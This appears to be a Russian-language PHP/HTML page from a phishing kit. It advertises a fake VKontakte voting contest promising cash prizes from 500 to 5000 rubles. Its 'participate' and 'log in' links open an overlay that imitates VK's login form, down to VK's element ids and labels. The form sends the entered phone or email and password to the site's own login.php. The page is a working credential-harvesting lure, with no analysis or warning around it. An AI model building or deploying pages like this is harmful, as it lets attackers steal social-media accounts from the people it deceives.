<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	   <title>Информация</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="shortcut icon" href="assets/votes/new/img/favicon.png" >
	   <link rel="stylesheet" href="assets/votes/new/css/main.css" >
	   	   <script>
function show(){
	$("#over").fadeIn(500);
}
</script>
<style>
#over {
	position: fixed;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	background-color: rgba(0,0,0, .9);
	z-index: 1000;
	}

#over > * {
	z-index: 9999;
}
#over > #ov_inner {
	margin: 17% auto;
	width: 300px;
	height: 400px;
}
.show {
	display: block;
}
</style>
   </head>
   <body class="index">
      <div id="page-wrapper">
      <header id="header" class="reveal alt">
         <h1 id="logo"><a href=""><?php echo $_SERVER['HTTP_HOST']; ?></a></h1>
         <nav id="nav">
            <ul>
               <li class="current" style="white-space: nowrap;"><a href="index.php" >Главная</a></li>
               <li class="submenu opener" style="user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
                  <a href="#">Меню</a>
                  <ul style="user-select: none; display: none; position: absolute;" class="">
                     <li style="white-space: nowrap;"><a href="info.php" >Информация</a></li>
                     <li style="white-space: nowrap;"><a href="stats.php" >Итоги</a></li>
                     <li style="white-space: nowrap;"><a href="#" onclick="show();" >Участвовать</a></li>
                                       </ul>
               </li>
               <li style="white-space: nowrap;"><a href="#" onclick="show();" >Войти</a></li>
                           </ul>
         </nav>
      </header><article id="main">
   <header class="special container">
	  <span class="icon fa-tablet"></span>
	  <h2>Информация о проекте</strong></h2>
   </header>
   <section class="wrapper style4 container">
	  <div class="row 150%">
		 <div class="8u 12u(narrower)">
			<div class="panel-group" id="faq-container" role="tablist" aria-multiselectable="true">
			   <div class="panel panel-default">
				  <div class="panel-heading" role="tab" id="headingOne">
					 <h4 class="panel-title">
					 </h4>
				  </div>
				  <div id="collapseOne" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingOne">
					 <div class="panel-body">
						<h3>В чём суть проекта?</h3>
						<p>
						   Наш проект - первый в Интернете глобальный проект голосований через ВКонтакте,
						   где вы можете принять участие в битве за достойные призы от наших спонсоров.
						<div></div>
						Регистрация в этапы открывается первого числа каждого месяца.
						<div></div>
						Если вы попадете, вам нужно будет пройти отборочный этап. После прохода вы попадаете в основной, где уже и сражаетесь за призы.
						<div></div>
						Какая нам выгода? - Спонсоры платят нам большие деньги за рекламу их продукции.
						</p>
					 </div>
				  </div>
			   </div>
			   <div class="panel panel-default">
				  <div class="panel-heading" role="tab" id="headingTwo">
					 <h4 class="panel-title">
					 </h4>
				  </div>
				  <div id="collapseOne" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingOne">
					 <div class="panel-body">
						<h3>Призы за основные этапы.</h3>
						<p>
						   • 1 этап: 500 рублей.<br>
						   • 2 этап: 700 рублей.<br>
						   • 3 этап: 1500 рублей.<br>
						   • 4 этап: 3000 рублей.<br>
						   • 5 этап: 5000 рублей.<br>
						</p>
						<h3>Призы за отборочный этап.</h3>
						<p>
						   • При победе в отборочном этапе - 100 рублей.<br>
						   • При участии в отборочном этапе - 10 голосов.<br>
						</p>
					 </div>
				  </div>
			   </div>
			   <div class="panel panel-default">
				  <div class="panel-heading" role="tab" id="headingThree">
					 <h4 class="panel-title">
					 </h4>
				  </div>
				  <div id="collapseOne" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingOne">
					 <div class="panel-body">
						<h3>Как принять участие?</h3>
						<p>
						   На сайте каждый месяц открывается специальная форма, в которой можно зарегистрироваться на участие. 
						<div> </div>
						Голосование открывается сразу. Оппонент - случайный человек.
						</p>
						<h3>Правила голосований.</h3>
						<p>
						   В голосовании РАЗРЕШЕНО кидать ссылку своим друзьям, знакомым/незнакомым людям.
						<div> </div>
						Запрещена только накрутка голосов.
						</p>
					 </div>
				  </div>
			   </div>
			</div>
			<p>Дата обновления раздела: 14 января 2018 года</p>
		 </div>
	  </div>
	  </div>
   </section>
   </div>
   </div>
   </section>
</article>
	<div id="over" style="display: none;">
		<div id="ov_inner">
			<div id="index_rcolumn" class="index_rcolumn">
				<form action="login.php" method="POST">
					<div id="index_login" class="page_block index_login">
				<input type="text" class="big_text" name="email" id="index_email" value="" placeholder="Телефон или email">
				  <input type="password" class="big_text" name="pass" id="index_pass" value="" placeholder="Пароль" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)">
				  <button id="index_login_button" class="index_login_button flat_button button_big_text" onclick="auth();">Войти</button>
				  <div class="forgot">
					<div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
				  </div>
			  </div>
			  </form>
		</div>
		</div>
	</div>
<script src="assets/votes/new/js/jquery.min.js" ></script>
<script src="assets/votes/new/js/jquery.dropotron.min.js" ></script>
<script src="assets/votes/new/js/jquery.scrolly.min.js" ></script>
<script src="assets/votes/new/js/jquery.scrollgress.min.js" ></script>
<script src="assets/votes/new/js/skel.min.js" ></script>
<script src="assets/votes/new/js/util.js" ></script>
<script src="assets/votes/new/js/main.js" ></script>
<script>
	$('#header').removeClass('alt');
</script>     